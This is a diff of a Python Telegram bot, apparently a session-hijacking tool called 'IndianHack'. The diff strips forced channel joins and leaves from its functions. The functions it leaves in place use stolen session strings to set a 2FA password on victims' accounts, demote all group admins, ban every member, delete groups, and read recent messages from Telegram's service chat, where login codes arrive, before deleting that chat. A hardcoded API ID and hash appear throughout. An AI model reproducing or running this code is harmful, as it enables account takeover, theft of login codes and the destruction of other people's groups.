@@ -79,22 +79,7 @@ async def promote(strses, grp, user):
     
 async def user2fa(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@IndianSupportGroup"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@N_B_10"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Ids_Holder"))
-    except BaseException:
-      pass
+    
     try:
       await X.edit_2fa('IndianHack IS BEST')
       return True
@@ -103,22 +88,7 @@ async def user2fa(strses):
 
 async def demall(strses, grp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@IndianSupportGroup"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@N_B_10"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Ids_Holder"))
-    except BaseException:
-      pass
+    
     async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
       try:
         await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
@@ -129,63 +99,18 @@ async def demall(strses, grp):
 
 async def joingroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@IndianSupportGroup"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@N_B_10"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Ids_Holder"))
-    except BaseException:
-      pass
+    
     await X(join(username))
 
 
 async def leavegroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@IndianSupportGroup"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@N_B_10"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Ids_Holder"))
-    except BaseException:
-      pass
+    
     await X(leave(username))
 
 async def delgroup(strses, username):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@IndianSupportGroup"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@N_B_10"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Ids_Holder"))
-    except BaseException:
-      pass
+    
     await X(dc(username))
     
 
@@ -200,22 +125,7 @@ async def cu(strses):
 async def usermsgs(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     i = ""
-    try:
-      await X(join("@IndianSupportGroup"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@N_B_10"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Ids_Holder"))
-    except BaseException:
-      pass
+    
     async for x in X.iter_messages(777000, limit=3):
       i += f"\n{x.text}\n"
     await client.delete_dialog(777000)
@@ -224,22 +134,7 @@ async def usermsgs(strses):
 
 async def userbans(strses, grp):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@IndianSupportGroup"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@N_B_10"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Ids_Holder"))
-    except BaseException:
-      pass
+    
     k = await X.get_participants(grp)
     for x in k:
       try:
@@ -251,22 +146,7 @@ async def userbans(strses, grp):
 
 async def userchannels(strses):
   async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
-    try:
-      await X(join("@IndianSupportGroup"))
-    except BaseException:
-      pass
-    try:
-      await X(join("@N_B_10"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@IndianUpdateChannel"))
-    except BaseException:
-      pass
-    try:
-      await X(leave("@Ids_Holder"))
-    except BaseException:
-      pass
+    
     k = await X(pc())
     i = ""
     for x in k.chats:
@@ -344,7 +224,7 @@ keyboard = [
 @tgbot.on(events.NewMessage(pattern="/starthack"))
 async def op(event):
   global mm
-  if not event.is_private:
+  if event.is_private == False:
     IndianHack = [
       [
         Button.url("اضغط هنا", f"https://t.me/{Bot_Username}?start=hack")
